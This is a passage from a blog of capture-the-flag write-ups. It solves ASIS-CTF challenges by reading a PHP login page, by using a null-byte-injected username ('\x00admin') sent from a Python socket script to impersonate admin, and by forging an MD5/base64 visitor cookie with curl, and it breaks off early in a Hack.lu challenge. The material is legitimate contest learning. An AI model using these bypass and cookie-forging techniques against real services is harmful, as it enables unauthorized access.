<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Welcome to Ubuntu 14.04.1 LTS <span class="o">(</span>GNU/Linux 3.13.0-37-generic x86_64<span class="o">)</span>
</span><span class='line'>
</span><span class='line'> * Documentation:  https://help.ubuntu.com/
</span><span class='line'>Last login: Sat Oct <span class="m">18</span> 00:05:47 <span class="m">2014</span> from 10.13.37.1
</span><span class='line'>guest@n1:~<span class="nv">$ </span>ls
</span><span class='line'>toolkit
</span><span class='line'>guest@n1:~<span class="nv">$ </span>ls -alh
</span><span class='line'>total 32K
</span><span class='line'>drwxr-xr-x <span class="m">4</span> guest guest 4.0K Oct <span class="m">18</span> 00:06 .
</span><span class='line'>drwxr-xr-x <span class="m">4</span> root  root  4.0K Oct <span class="m">17</span> 01:40 ..
</span><span class='line'>-rw------- <span class="m">1</span> guest guest    <span class="m">0</span> Oct <span class="m">18</span> 00:06 .bash_history
</span><span class='line'>-rw-r--r-- <span class="m">1</span> guest guest  <span class="m">220</span> Oct <span class="m">17</span> 01:40 .bash_logout
</span><span class='line'>-rw-r--r-- <span class="m">1</span> guest guest 3.6K Oct <span class="m">17</span> 01:40 .bashrc
</span><span class='line'>drwx------ <span class="m">2</span> guest guest 4.0K Oct <span class="m">17</span> 01:42 .cache
</span><span class='line'>-rw-r--r-- <span class="m">1</span> guest guest  <span class="m">675</span> Oct <span class="m">17</span> 01:40 .profile
</span><span class='line'>drwxr-xr-t <span class="m">2</span> root  root  4.0K Oct <span class="m">17</span> 01:41 toolkit
</span><span class='line'>-rw------- <span class="m">1</span> guest guest  <span class="m">777</span> Oct <span class="m">18</span> 00:06 .viminfo
</span></code></pre></td></tr></table></div></figure>


<p>For some reason, we could use <code>tcpdump</code> to look at incoming traffic:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>guest@n1:~/toolkit<span class="nv">$ </span>./tcpdump
</span><span class='line'>tcpdump: verbose output suppressed, use -v or -vv <span class="k">for</span> full protocol decode
</span><span class='line'>listening on eth0, link-type EN10MB <span class="o">(</span>Ethernet<span class="o">)</span>, capture size <span class="m">65535</span> bytes
</span><span class='line'>11:13:03.921683 IP n1.ssh &gt; 10.13.37.1.52543: Flags <span class="o">[</span>P.<span class="o">]</span>, seq 1154997930:1154998122, ack 2969808471, win 349, options <span class="o">[</span>nop,nop,TS val <span class="m">10598245</span> ecr 188495<span class="o">]</span>, length 192
</span><span class='line'>11:13:03.934082 IP 10.13.37.1.52543 &gt; n1.ssh: Flags <span class="o">[</span>.<span class="o">]</span>, ack 192, win 661, options <span class="o">[</span>nop,nop,TS val <span class="m">188517</span> ecr 10598245<span class="o">]</span>, length 0
</span><span class='line'>11:13:03.975864 IP 10.13.37.1.37658 &gt; n1.41730: Flags <span class="o">[</span>S<span class="o">]</span>, seq 2811437647, win 1024, options <span class="o">[</span>mss 1369<span class="o">]</span>, length 0
</span><span class='line'>11:13:03.975882 IP n1.41730 &gt; 10.13.37.1.37658: Flags <span class="o">[</span>R.<span class="o">]</span>, seq 0, ack 2811437648, win 0, length 0
</span><span class='line'>11:13:03.987686 IP 10.13.37.1.43518 &gt; n1.41511: Flags <span class="o">[</span>S<span class="o">]</span>, seq 4021855713, win 1024, options <span class="o">[</span>mss 1369<span class="o">]</span>, length 0
</span><span class='line'>11:13:03.987704 IP n1.41511 &gt; 10.13.37.1.43518: Flags <span class="o">[</span>R.<span class="o">]</span>, seq 0, ack 402185571
</span></code></pre></td></tr></table></div></figure>


<p>But we&rsquo;re looking for a flag! I wanted to see what made the login page tick.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>guest@n1:~/toolkit<span class="nv">$ </span>cat /var/www/html/index.php
</span><span class='line'>&lt;?php
</span><span class='line'>
</span><span class='line'>error_reporting<span class="o">(</span>0<span class="o">)</span><span class="p">;</span>
</span><span class='line'>ini_set<span class="o">(</span><span class="s1">&#39;display_errors&#39;</span>, 0<span class="o">)</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;pass&#39;</span><span class="o">])</span> <span class="o">&amp;&amp;</span> strlen<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;pass&#39;</span><span class="o">])</span> &lt; 12<span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="s1">&#39;Validation failed: The password field too short.&#39;</span><span class="p">;</span> die<span class="o">()</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="o">(</span>isset<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;user&#39;</span><span class="o">]))</span> <span class="o">{</span>
</span><span class='line'>  <span class="k">if</span><span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;user&#39;</span><span class="o">]</span> <span class="o">==</span> <span class="s1">&#39;manager&#39;</span> <span class="o">&amp;&amp;</span> md5<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">&#39;pass&#39;</span><span class="o">])</span> <span class="o">==</span> <span class="s1">&#39;e701a78ce9d38201e9fc17737be0996d&#39;</span><span class="o">)</span> <span class="o">{</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="s1">&#39;The secret is behind &lt;strong&gt;0f388689dc4728cfde0de9a1ee47c8d3&lt;/strong&gt;. Don\&#39;t tell anyone!&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
</span><span class='line'>    <span class="nb">echo</span> <span class="s1">&#39;Wrong username or password.&#39;</span><span class="p">;</span>
</span><span class='line'>  <span class="o">}</span>
</span><span class='line'>  die<span class="o">()</span><span class="p">;</span>
</span><span class='line'><span class="o">}</span>
</span><span class='line'>
</span><span class='line'>?&gt;
</span><span class='line'>&lt;!DOCTYPE html&gt;
</span><span class='line'>...snip...
</span></code></pre></td></tr></table></div></figure>


<p>Apparently, the flag is &lsquo;behind&rsquo; <code>0f388689dc4728cfde0de9a1ee47c8d3</code>. This md5 hash decrypts to <code>ididyourmom</code>, which is also the flag. What a nasty secret this manager has!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ASIS-CTF: Secure Hobby]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/01/asis-ctf-secure-hobby/"/>
    <updated>2014-11-01T14:56:11+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/01/asis-ctf-secure-hobby</id>
    <content type="html"><![CDATA[<p>For Secure Hobby, a 250 point challenge, we were given a file and a place to connect to. The archive contained a binary, which looked okay enough to run. It opened a port on localhost. Upon connecting using <code>nc</code>, the program first crashes because it can&rsquo;t find <code>flag</code> and <code>namak</code>. After creating those files and connecting again, we are presented with the following:</p>

<!--more-->




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc localhost 35565
</span><span class='line'>-------------------------------------------------
</span><span class='line'><span class="p">|</span>  Welcome to Super Secure Auth Engine <span class="p">|</span>
</span><span class='line'>-------------------------------------------------
</span><span class='line'>
</span><span class='line'>1<span class="o">)</span> Register
</span><span class='line'>2<span class="o">)</span> Login check
</span><span class='line'>3<span class="o">)</span> Show my secret
</span><span class='line'>
</span><span class='line'>Enjoy <span class="p">;</span><span class="o">)</span>
</span><span class='line'>1
</span><span class='line'>Enter username: <span class="nb">test</span>
</span><span class='line'>Your key <span class="k">for</span> login is: 6447567a64413d3d098f6bcd4621d373cade4e832627b4f6
</span></code></pre></td></tr></table></div></figure>


<p>Hmm. The second function verifies a login and the third displays a secret. Trying to register the user &lsquo;admin&rsquo; resulted in an error. Still, it&rsquo;s fair to assume we need to get the secret of the admin user. Let&rsquo;s break this key down.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> -ne <span class="s1">&#39;test&#39;</span> <span class="p">|</span>md5sum
</span><span class='line'>098f6bcd4621d373cade4e832627b4f6  -
</span></code></pre></td></tr></table></div></figure>


<p>This looks like the last part of the login. What about the start? It seems to end with <code>\x3d</code> which is ASCII <code>=</code>. This screams base64!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>xxd -p -r
</span><span class='line'>6447567a64413d3d
</span><span class='line'><span class="nv">dGVzdA</span><span class="o">==</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">echo</span> -ne <span class="s1">&#39;dGVzdA==&#39;</span> <span class="p">|</span>base64 -d
</span><span class='line'><span class="nb">test</span>
</span></code></pre></td></tr></table></div></figure>


<p>So putting it all together again:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> -ne <span class="s1">&#39;admin&#39;</span> <span class="p">|</span>base64
</span><span class='line'><span class="nv">YWRtaW4</span><span class="o">=</span>
</span><span class='line'><span class="nv">$ </span><span class="nb">echo</span> -ne <span class="s1">&#39;admin&#39;</span> <span class="p">|</span>md5sum
</span><span class='line'>21232f297a57a5a743894a0e4a801fc3  -
</span><span class='line'>xxd -p
</span><span class='line'><span class="nv">YWRtaW4</span><span class="o">=</span>
</span><span class='line'>595752746157343d0a
</span></code></pre></td></tr></table></div></figure>


<p>Looks like <code>595752746157343d21232f297a57a5a743894a0e4a801fc3</code> is the login we need! But alas, this doesnt work. On the remote box, registering <code>test</code> returns:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc asis-ctf.ir 12439
</span><span class='line'>-------------------------------------------------
</span><span class='line'><span class="p">|</span>  Welcome to Super Secure Auth Engine <span class="p">|</span>
</span><span class='line'>-------------------------------------------------
</span><span class='line'>
</span><span class='line'>1<span class="o">)</span> Register
</span><span class='line'>2<span class="o">)</span> Login check
</span><span class='line'>3<span class="o">)</span> Show my secret
</span><span class='line'>
</span><span class='line'>Enjoy <span class="p">;</span><span class="o">)</span>
</span><span class='line'>1
</span><span class='line'>Enter username: <span class="nb">test</span>
</span><span class='line'>Your key <span class="k">for</span> login is: 6447567a64413d3dd0211e3e26985465726312d056f9339f
</span></code></pre></td></tr></table></div></figure>


<p>It has to do with the <code>namak</code> file. Namak is Persian for salt.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span><span class="nb">echo</span> <span class="s1">&#39;0&#39;</span> &gt; namak
</span></code></pre></td></tr></table></div></figure>


<p>Now, registering test on the localhost server returns <code>Your key for login is: 6447567a64413d3d1c13f2701648e0b0d46d8a2a5a131a53</code>. Furthermore, it looks like the salt is prepended to before hashing. We grabbed md5(salt) using a small Python script:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&#39;localhost&#39;, 35565))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;asis-ctf.ir&#39;</span><span class="p">,</span> <span class="mi">12439</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>The output showed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>Enter username:
</span><span class='line'>Your key <span class="k">for</span> login is:
</span><span class='line'>5624717e9a5fd673f17f5678c6303ffe
</span></code></pre></td></tr></table></div></figure>


<p>So the md5 of the salt would be <code>5624717e9a5fd673f17f5678c6303ffe</code>. I enlisted the help of NullMode to crack this hash, but to no avail. Instead of cracking this hash (seems inpossible), we decided to focus on the string comparison. We cannot register a username containing <code>admin</code>, but perhaps we can circumvent this checking system somehow. First, I tried:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>admin                                              <span class="c">#</span>
</span></code></pre></td></tr></table></div></figure>


<p>But this led to the same error message. Apparently, the username is not truncated. Instead, we assumed the check-string-for-admin uses normal string routines. These stop when they encounter a null-byte. Hash-functions on the other hand, do not. Let&rsquo;s register a user <code>\x00admin</code> using Python:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">time</span><span class="o">,</span> <span class="nn">re</span><span class="o">,</span> <span class="nn">struct</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'><span class="c">#s.connect((&#39;localhost&#39;, 35565))</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;asis-ctf.ir&#39;</span><span class="p">,</span> <span class="mi">12439</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="se">\x00</span><span class="s">admin</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>This little gem returned <code>4147466b62576c7503812bbd45e23c059a0eab18e936b7ed</code>. Let&rsquo;s try it out!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc asis-ctf.ir 12439
</span><span class='line'>-------------------------------------------------
</span><span class='line'><span class="p">|</span>  Welcome to Super Secure Auth Engine <span class="p">|</span>
</span><span class='line'>-------------------------------------------------
</span><span class='line'>
</span><span class='line'>1<span class="o">)</span> Register
</span><span class='line'>2<span class="o">)</span> Login check
</span><span class='line'>3<span class="o">)</span> Show my secret
</span><span class='line'>
</span><span class='line'>Enjoy <span class="p">;</span><span class="o">)</span>
</span><span class='line'>2
</span><span class='line'>Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
</span><span class='line'>OK
</span><span class='line'>User admin authenticated
</span></code></pre></td></tr></table></div></figure>


<p>Holy crap, it worked! Let&rsquo;s grab that secret! Fingers crossed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>nc asis-ctf.ir 12439
</span><span class='line'>-------------------------------------------------
</span><span class='line'><span class="p">|</span>  Welcome to Super Secure Auth Engine <span class="p">|</span>
</span><span class='line'>-------------------------------------------------
</span><span class='line'>
</span><span class='line'>1<span class="o">)</span> Register
</span><span class='line'>2<span class="o">)</span> Login check
</span><span class='line'>3<span class="o">)</span> Show my secret
</span><span class='line'>
</span><span class='line'>Enjoy <span class="p">;</span><span class="o">)</span>
</span><span class='line'>3
</span><span class='line'>Enter key: 4147466b62576c7503812bbd45e23c059a0eab18e936b7ed
</span><span class='line'>The flag is: ASIS_65cc76f02093977bfd7629086e813666
</span></code></pre></td></tr></table></div></figure>


<p>BOOM! We just landed another flag :) This one was actually fun to solve!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[ASIS-CTF: Lottery]]></title>
    <link href="http://barrebas.github.io/blog/2014/11/01/asis-ctf-lottery/"/>
    <updated>2014-11-01T14:52:32+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/11/01/asis-ctf-lottery</id>
    <content type="html"><![CDATA[<p>Lottery was a 100 point web challenge in the ASIS Finals CTF. The description only said &lsquo;Go here: <a href="http://asis-ctf.ir:12437">http://asis-ctf.ir:12437</a>&rsquo;. That webpage was mostly non-functional, but said that the 1234567890th visitor would win a <em>prize</em>. Gee, I wonder what that is? My browser informed me that there were no cookies, but I wasn&rsquo;t convinced.</p>

<!--more-->


<p><img src="http://barrebas.github.io/assets/asisctf/lottery-01.png" alt="" /></p>

<p>I turned to <code>curl</code>. Luckily, curl informed me that there was indeed a cookie been set. A cookie named &lsquo;Visitor&rsquo;, no less:</p>

<p><img src="http://barrebas.github.io/assets/asisctf/lottery-02.png" alt="" /></p>

<p>The value looked like base64 so I decoded it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo -ne 'MTM4NjozNjM3NjNlNWMzZGMzYTY4YjM5OTA1OGMzNGFlY2YyYw==' |base64 -d
</span><span class='line'>1386:363763e5c3dc3a68b399058c34aecf2c</span></code></pre></td></tr></table></div></figure>


<p>Hmm. I figured that first number was a visitor number. What could the second string be? MD5 maybe?</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo -ne 1386 |md5sum
</span><span class='line'>363763e5c3dc3a68b399058c34aecf2c  -</span></code></pre></td></tr></table></div></figure>


<p>Spot on. It&rsquo;s now easy to fake the right cookie:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ echo -ne 1234567890 |md5sum
</span><span class='line'>e807f1fcf82d132f9bb018ca6738a19f  -
</span><span class='line'>$ echo -ne '1234567890:e807f1fcf82d132f9bb018ca6738a19f' |base64
</span><span class='line'>MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==</span></code></pre></td></tr></table></div></figure>


<p>And feed it into curl:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ curl -v http://asis-ctf.ir:12437/ --cookie "Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg=="
</span><span class='line'>* About to connect() to asis-ctf.ir port 12437 (#0)
</span><span class='line'>*   Trying 87.107.124.12...
</span><span class='line'>* connected
</span><span class='line'>* Connected to asis-ctf.ir (87.107.124.12) port 12437 (#0)
</span><span class='line'>&gt; GET / HTTP/1.1
</span><span class='line'>&gt; User-Agent: curl/7.26.0
</span><span class='line'>&gt; Host: asis-ctf.ir:12437
</span><span class='line'>&gt; Accept: */*
</span><span class='line'>&gt; Cookie: Visitor=MTIzNDU2Nzg5MDplODA3ZjFmY2Y4MmQxMzJmOWJiMDE4Y2E2NzM4YTE5Zg==
</span><span class='line'>&gt; 
</span><span class='line'>...snip...
</span><span class='line'>Google+"&gt;&lt;/a&gt; &lt;/div&gt;&lt;/div&gt;&lt;div class="data-wrapper"&gt;&lt;p class="title"&gt;The 1234567890 th visitor, the prize awarded.&lt;/p&gt;&lt;div class="content"&gt;Anyone who has visited our site is the 1234567890 th Special prizes are awarded. &lt;br/&gt;the flag is: ASIS_9f1af649f25108144fc38a01f8767c0c&lt;/div&gt;&lt;/div&gt;&lt;div class="footer"&gt;&lt;div class="p</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>ASIS_9f1af649f25108144fc38a01f8767c0c</code>. Easy!</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Hack.lu the Union Write-up]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/26/hack-dot-lu-the-union-write-up/"/>
    <updated>2014-10-26T16:59:19+01:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/26/hack-dot-lu-the-union-write-up</id>
    <content type="html"><![CDATA[<p>Hack.lu 2014 was a very fun, western-themed CTF. For <code>the Union</code>, we were given an executable and a place to connect to. We need to find <code>secret.txt</code> and the hint is that &ldquo;not everything is what it seems&rdquo;. Uh-huh.</p>

<!--more-->


<p><img src="http://barrebas.github.io/assets/hacklu-theunion/00.png" alt="" /></p>

<p>Upon connecting, the program asks for the union&rsquo;s slogan and secret word:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~<span class="nv">$ </span>nc wildwildweb.fluxfingers.net 1423
</span><span class='line'>  Welcome to
</span><span class='line'> _   _                        _             _
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>__   ___   _   _ _ __ <span class="o">(</span>_<span class="o">)</span> ___  _ __ <span class="o">(</span> <span class="o">)</span>___
</span><span class='line'><span class="p">|</span> __<span class="p">|</span> <span class="s1">&#39;_ \ / _ \ | | | | &#39;</span>_ <span class="se">\|</span> <span class="p">|</span>/ _ <span class="se">\|</span> <span class="err">&#39;</span>_ <span class="se">\|</span>// __<span class="p">|</span>
</span><span class='line'><span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>  __/ <span class="p">|</span> <span class="p">|</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="o">(</span>_<span class="o">)</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="se">\_</span>_ <span class="se">\</span>
